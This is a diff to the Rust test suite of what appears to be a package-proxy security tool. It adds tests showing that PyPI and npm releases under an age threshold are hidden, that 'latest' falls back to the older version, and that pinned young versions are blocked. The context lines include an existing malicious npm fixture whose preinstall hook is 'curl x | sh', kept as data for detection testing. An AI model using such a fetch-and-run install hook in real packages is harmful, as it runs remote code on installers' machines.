@@ -67,6 +67,14 @@ fn pypi_packages() -> Vec<(&'static str, &'static str, &'static [u8], String)> {
             "2015-01-01T00:00:00.000000Z".into(),
         ),
         ("revived", "1.1.0", b"benign revived again", old.clone()),
+        // An established project with a release from an hour ago.
+        ("rolling", "1.0.0", b"benign rolling", old.clone()),
+        (
+            "rolling",
+            "1.1.0",
+            b"benign rolling 1.1.0",
+            (Utc::now() - chrono::Duration::hours(1)).to_rfc3339(),
+        ),
         // 1.0.0 carries PEP 740 provenance in the JSON simple index, 1.1.0 does not.
         ("unsigned", "1.0.0", b"benign attested", old.clone()),
         (
@@ -227,6 +235,21 @@ fn npm_packages() -> Vec<(&'static str, &'static str, &'static [u8], String, Val
             b"EVIL js",
             old.clone(),
             json!({"scripts": {"preinstall": "curl x | sh"}}),
+        ),
+        // An established package with a release from an hour ago.
+        (
+            "rolling-js",
+            "1.0.0",
+            b"benign rolling-js",
+            old.clone(),
+            json!({}),
+        ),
+        (
+            "rolling-js",
+            "1.1.0",
+            b"benign rolling-js 1.1.0",
+            (Utc::now() - chrono::Duration::hours(1)).to_rfc3339(),
+            json!({}),
         ),
         // An established package whose latest release looks like an account takeover.
         (
@@ -2122,5 +2145,82 @@ async fn blocks_are_posted_to_the_webhook_once() {
         metrics.contains("customs_notifications_total{outcome=\"sent\"} 1"),
         "{metrics}"
     );
+    h.stop().await;
+}
+
+#[tokio::test(flavor = "multi_thread")]
+async fn young_releases_are_hidden_so_unpinned_installs_resolve_older() {
+    let h = Harness::start(|_| {}).await;
+    // PyPI HTML and JSON simple pages leave out the release from an hour ago.
+    let r = h.get("/pypi/simple/rolling/").await;
+    assert_eq!(r.headers()["x-customs-hidden-versions"], "1");
+    let html = r.text().await.unwrap();
+    assert!(html.contains(&file_name("rolling", "1.0.0")), "{html}");
+    assert!(!html.contains(&file_name("rolling", "1.1.0")), "{html}");
+    let r = h
+        .http
+        .get(format!("{}/pypi/simple/rolling/", h.base))
+        .header("accept", "application/vnd.pypi.simple.v1+json")
+        .send()
+        .await
+        .unwrap();
+    let doc: Value = r.json().await.unwrap();
+    let files: Vec<&str> = doc["files"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .map(|f| f["filename"].as_str().unwrap())
+        .collect();
+    assert_eq!(files, vec![file_name("rolling", "1.0.0")]);
+    // A pin on the young release is still refused, with the rule's reason.
+    let r = h.get(&pypi_file_path("rolling", "1.1.0")).await;
+    assert_eq!(r.status(), 403);
+    // Checks resolve unpinned specs the way the proxy serves them.
+    let (_, v) = h.check("pypi", "rolling", None).await;
+    assert_eq!(v["version"], "1.0.0");
+    assert_eq!(v["decision"], "allow");
+    let (_, v) = h.check("pypi", "rolling", Some(">=1.0")).await;
+    assert_eq!(v["version"], "1.0.0");
+    let (_, v) = h.check("pypi", "rolling", Some("==1.1.0")).await;
+    assert_eq!(v["version"], "1.1.0");
+    assert_eq!(v["decision"], "block");
+    assert_eq!(
+        h.check("pypi", "rolling", None).await.1["policy_hits"][0]["rule"],
+        "min_age_resolution"
+    );
+    // A client whose installer skips the proxy sees every version, and so must the check.
+    let r = h
+        .http
+        .post(format!("{}/api/check", h.base))
+        .json(&json!({"ecosystem": "pypi", "name": "rolling", "resolve": "upstream"}))
+        .send()
+        .await
+        .unwrap();
+    let v: Value = r.json().await.unwrap();
+    assert_eq!(v["version"], "1.1.0");
+    assert_eq!(v["decision"], "block");
+
+    // npm: the version is gone and `latest` moves back.
+    let r = h.get("/npm/rolling-js").await;
+    assert_eq!(r.headers()["x-customs-hidden-versions"], "1");
+    let doc: Value = r.json().await.unwrap();
+    assert_eq!(doc["dist-tags"]["latest"], "1.0.0");
+    assert!(doc["versions"].get("1.1.0").is_none());
+    assert!(doc["versions"].get("1.0.0").is_some());
+    let (_, v) = h.check("npm", "rolling-js", Some("^1.0.0")).await;
+    assert_eq!(v["version"], "1.0.0");
+    // A package with no older release keeps it, so the block names the rule.
+    let doc: Value = h.get("/npm/freshpkg").await.json().await.unwrap();
+    assert!(doc["versions"].get("1.0.0").is_some());
+    h.stop().await;
+
+    // Monitor mode serves everything and so hides nothing.
+    let h = Harness::start(|p| p.mode = customs::config::Mode::Monitor).await;
+    let doc: Value = h.get("/npm/rolling-js").await.json().await.unwrap();
+    assert_eq!(doc["dist-tags"]["latest"], "1.1.0");
+    h.stop().await;
+    let h = Harness::start(|p| p.hide_young_versions = false).await;
+    let html = h.get("/pypi/simple/rolling/").await.text().await.unwrap();
+    assert!(html.contains(&file_name("rolling", "1.1.0")), "{html}");
     h.stop().await;
 }
